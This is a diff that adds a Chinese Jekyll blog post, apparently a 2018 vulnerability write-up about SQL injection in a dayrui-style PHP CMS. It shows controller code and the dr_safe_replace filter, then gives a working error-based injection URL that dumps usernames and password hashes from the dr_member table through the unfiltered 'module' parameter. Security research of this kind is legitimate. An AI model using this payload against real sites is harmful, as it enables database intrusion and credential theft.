+        <span class="nv">$acount</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">get_cache</span><span class="p">(</span><span class="s1">'member'</span><span class="p">,</span> <span class="s1">'setting'</span><span class="p">,</span> <span class="s1">'permission'</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">markrule</span><span class="p">,</span> <span class="s1">'attachsize'</span><span class="p">);</span>
+        <span class="nv">$acount</span> <span class="o">=</span> <span class="nv">$acount</span> <span class="o">?</span> <span class="nv">$acount</span> <span class="o">:</span> <span class="mi">1024000</span><span class="p">;</span>
+        <span class="nv">$ucount</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">db</span><span class="o">-&gt;</span><span class="na">select</span><span class="p">(</span><span class="s1">'sum(`filesize`) as total'</span><span class="p">)</span><span class="o">-&gt;</span><span class="na">where</span><span class="p">(</span><span class="s1">'uid'</span><span class="p">,</span> <span class="p">(</span><span class="nx">int</span><span class="p">)</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">uid</span><span class="p">)</span><span class="o">-&gt;</span><span class="na">limit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">-&gt;</span><span class="na">get</span><span class="p">(</span><span class="s1">'attachment'</span><span class="p">)</span><span class="o">-&gt;</span><span class="na">row_array</span><span class="p">();</span>
+        <span class="nv">$ucount</span> <span class="o">=</span> <span class="p">(</span><span class="nx">int</span><span class="p">)</span><span class="nv">$ucount</span><span class="p">[</span><span class="s1">'total'</span><span class="p">];</span>
+        <span class="nv">$acount</span> <span class="o">=</span> <span class="nv">$acount</span> <span class="o">*</span> <span class="mi">1024</span> <span class="o">*</span> <span class="mi">1024</span><span class="p">;</span>
+        <span class="nv">$scount</span> <span class="o">=</span> <span class="nb">max</span><span class="p">(</span><span class="nv">$acount</span> <span class="o">-</span> <span class="nv">$ucount</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+        
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">template</span><span class="o">-&gt;</span><span class="na">assign</span><span class="p">(</span><span class="k">array</span><span class="p">(</span>
+            <span class="s1">'ext'</span> <span class="o">=&gt;</span> <span class="nv">$ext</span><span class="p">,</span>
+            <span class="s1">'list'</span> <span class="o">=&gt;</span> <span class="nv">$data</span><span class="p">,</span>
+            <span class="s1">'table'</span> <span class="o">=&gt;</span> <span class="nv">$table</span><span class="p">,</span>
+            <span class="s1">'module'</span> <span class="o">=&gt;</span> <span class="nv">$module</span><span class="p">,</span>
+            <span class="s1">'acount'</span> <span class="o">=&gt;</span> <span class="nv">$acount</span><span class="p">,</span>
+            <span class="s1">'ucount'</span> <span class="o">=&gt;</span> <span class="nv">$ucount</span><span class="p">,</span>
+            <span class="s1">'scount'</span> <span class="o">=&gt;</span> <span class="nv">$scount</span><span class="p">,</span>
+            <span class="s1">'pages'</span> <span class="o">=&gt;</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">get_member_pagination</span><span class="p">(</span><span class="nx">dr_member_url</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">router</span><span class="o">-&gt;</span><span class="na">class</span><span class="o">.</span><span class="s1">'/'</span><span class="o">.</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">router</span><span class="o">-&gt;</span><span class="na">method</span><span class="p">,</span> <span class="k">array</span><span class="p">(</span><span class="s1">'ext'</span> <span class="o">=&gt;</span> <span class="nv">$ext</span><span class="p">)),</span> <span class="nv">$total</span><span class="p">),</span>
+            <span class="s1">'page_total'</span> <span class="o">=&gt;</span> <span class="nv">$total</span><span class="p">,</span>
+        <span class="p">));</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">template</span><span class="o">-&gt;</span><span class="na">display</span><span class="p">(</span><span class="s1">'account_attachment_list.html'</span><span class="p">);</span>
+    <span class="p">}</span>
+</code></pre></div></div>
+
+<p><code class="highlighter-rouge">dr_safe_replace</code>函数：</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="sd">/**
+ * 安全过滤函数
+ *
+ * @param $string
+ * @return string
+ */</span>
+<span class="k">function</span> <span class="nf">dr_safe_replace</span><span class="p">(</span><span class="nv">$string</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nv">$string</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s1">'%20'</span><span class="p">,</span> <span class="s1">''</span><span class="p">,</span> <span class="nv">$string</span><span class="p">);</span>
+    <span class="nv">$string</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s1">'%27'</span><span class="p">,</span> <span class="s1">''</span><span class="p">,</span> <span class="nv">$string</span><span class="p">);</span>
+    <span class="nv">$string</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s1">'%2527'</span><span class="p">,</span> <span class="s1">''</span><span class="p">,</span> <span class="nv">$string</span><span class="p">);</span>
+    <span class="nv">$string</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s1">'*'</span><span class="p">,</span> <span class="s1">''</span><span class="p">,</span> <span class="nv">$string</span><span class="p">);</span>
+    <span class="nv">$string</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s1">'"'</span><span class="p">,</span> <span class="s1">'&amp;quot;'</span><span class="p">,</span> <span class="nv">$string</span><span class="p">);</span>
+    <span class="nv">$string</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">"'"</span><span class="p">,</span> <span class="s1">''</span><span class="p">,</span> <span class="nv">$string</span><span class="p">);</span>
+    <span class="nv">$string</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s1">'"'</span><span class="p">,</span> <span class="s1">''</span><span class="p">,</span> <span class="nv">$string</span><span class="p">);</span>
+    <span class="nv">$string</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s1">';'</span><span class="p">,</span> <span class="s1">''</span><span class="p">,</span> <span class="nv">$string</span><span class="p">);</span>
+    <span class="nv">$string</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s1">'&lt;'</span><span class="p">,</span> <span class="s1">'&amp;lt;'</span><span class="p">,</span> <span class="nv">$string</span><span class="p">);</span>
+    <span class="nv">$string</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s1">'&gt;'</span><span class="p">,</span> <span class="s1">'&amp;gt;'</span><span class="p">,</span> <span class="nv">$string</span><span class="p">);</span>
+    <span class="nv">$string</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">"{"</span><span class="p">,</span> <span class="s1">''</span><span class="p">,</span> <span class="nv">$string</span><span class="p">);</span>
+    <span class="nv">$string</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s1">'}'</span><span class="p">,</span> <span class="s1">''</span><span class="p">,</span> <span class="nv">$string</span><span class="p">);</span>
+    <span class="k">return</span> <span class="nv">$string</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>可见调用这个方法还是有用的，但是在官方代码中，<code class="highlighter-rouge">module</code>并没有过滤。</p>
+
+<p>于是根据数据库结构构造EXP……</p>
+
+<p><img src="http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2017-08-18/0x07.jpg" alt="POC" /></p>
+
+<p><img src="http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2017-08-18/0x06.jpg" alt="POC" /></p>
+
+<p><code class="highlighter-rouge">index.php?s=member&amp;c=account&amp;m=attachment&amp;module=&amp;ext=pa&amp;module=d%" and(select 1 from(select count(*),concat((select (select (SELECT distinct concat('[',username,0x3a,password,'] by Coralab') FROM dr_member limit 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) -- x</code></p>
+
+<p>是不是看的很舒服？ 哈哈，这个基于框架的CMS漏洞还是很多的，抽空继续看，下班了、</p>
+
+<h2 id="0x04-总结">0x04 总结</h2>
+
+<p>框架中有很多过滤方法，但是开发人员并没有调用它们，虽说Module和Controller分开写没错，但是这个CMS目录结构很散，要不是我之前开发过漏洞平台，也许是看不懂它的加载的……没错，我现在也看不懂。挖掘SQL注入我主要是寻找数据库驱动，然后在query函数体内打印SQL语句，是不是很生猛？</p>
+
+<p>后面有时间了继续总结~  周五了，可以嗨了！</p>
+
+  </div>
+
+</article>
+
+</section>
+<nav class="navbar navbar-default navbar-fixed-bottom">
+  <div class="container footer-content">
+    Copyright @ 2018 by 倾旋<br>
+    Powered By Jekyll
+  </div>
+</nav>
+
+  </body>
+
+</html>
